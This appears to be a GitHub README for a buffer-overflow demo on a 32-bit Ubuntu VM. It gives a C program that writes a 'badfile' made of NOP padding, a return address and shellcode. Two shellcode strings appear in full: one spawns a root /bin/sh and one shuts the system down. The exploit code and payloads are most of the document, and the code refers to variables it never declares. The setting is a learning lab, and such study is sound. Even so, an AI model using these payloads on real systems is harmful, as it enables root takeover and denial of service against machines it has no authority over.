# Buffer-Overflow-attacks

int main(){
	FILE* badf;
	badf = fopen("badfile","w");
	char buff[517];
	for(int i=0;i<517;i++)
		buff[i] = nop[0];
	int ind = 0;	
	for(;ind<24;){
		buff[ind++] = 'd';
	}
	for(int i=0;i<strlen(ret_addr);i++){
		buff[ind++] = ret_addr[i];
	}
	ind += 64;
	//for(int i=0;i<strlen(shutdown_shellcode);i++){
	//	buff[ind++] = shutdown_shellcode[i];
	//}
	for(int i=0;i<strlen(root_shell);i++){
		buff[ind++] = root_shell[i];
	}
	buff[ind] = '\0';
	fwrite(buff,517,1,badf);
	return 0;
}

In this demo I walk through the process of using a buffer overflow vulnerability in the C++ strcpy() function to both spawn a root shell and shut down the system. For this demo I am using 32-bit Linux Ubuntu 14.04 in Virtual Box. My system is Little Endian (as is the case with most, if not all, Intel CPU's from what I understand). 

Applications used: g++, perl, gdb

**Notes**

A quick way to find the endianess of your system:

https://github.com/asanchez1103/Code-...​

While filming, I forgot that $rsp is the stack pointer on a 64-bit system

Shell codes were obtained from: http://shell-storm.org/shellcode/​

Spawn Root Shell shellcode:
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh


Shutdown shellcode 
-http://shell-storm.org/shellcode/file...​
\x31\xc0\x31\xd2\x50\x66\x68\x2d\x68\x89\xe7\x50\x6a\x6e\x66\xc7\x44\x24\x01\x6f\x77\x89\xe7\x50\x68\x64\x6f\x77\x6e\x68\x73\x68\x75\x74\x68\x6e\x2f\x2f\x2f\x68\x2f\x73\x62\x69\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80
